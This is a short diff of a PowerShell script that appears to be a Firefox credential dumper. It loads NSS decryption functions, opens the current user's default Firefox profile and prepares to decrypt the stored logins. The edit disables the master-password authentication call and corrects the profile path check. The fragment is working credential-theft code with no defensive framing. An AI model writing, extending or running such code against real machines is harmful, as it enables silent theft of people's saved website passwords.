@@ -895,18 +895,18 @@
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
     
-
     $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
+    
     $defaultProfile = $(Get-ChildItem $profilePath).FullName
     $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
     Write-Verbose "[+]NSS_Init result: $NSSInitResult"
     $keySlot = $PK11_GetKeySlot.Invoke()
     Write-Verbose "[+]Keyslot : $keySlot"
-    $PK11_AuthResult = $PK11_Authenticate.Invoke($keySlot, $True, 0)
-    Write-Verbose "[+]PK11_Authenticate Result: $PK11_AuthResult"
+    #$PK11_AuthResult = $PK11_Authenticate.Invoke($keySlot, $True, 0)
+    #Write-Verbose "[+]PK11_Authenticate Result: $PK11_AuthResult"
     
 
-    if(Test-Path $profilePath)
+    if(Test-Path $defaultProfile)
     {
         #Web.extensions assembly is necessary for handling json files
         try
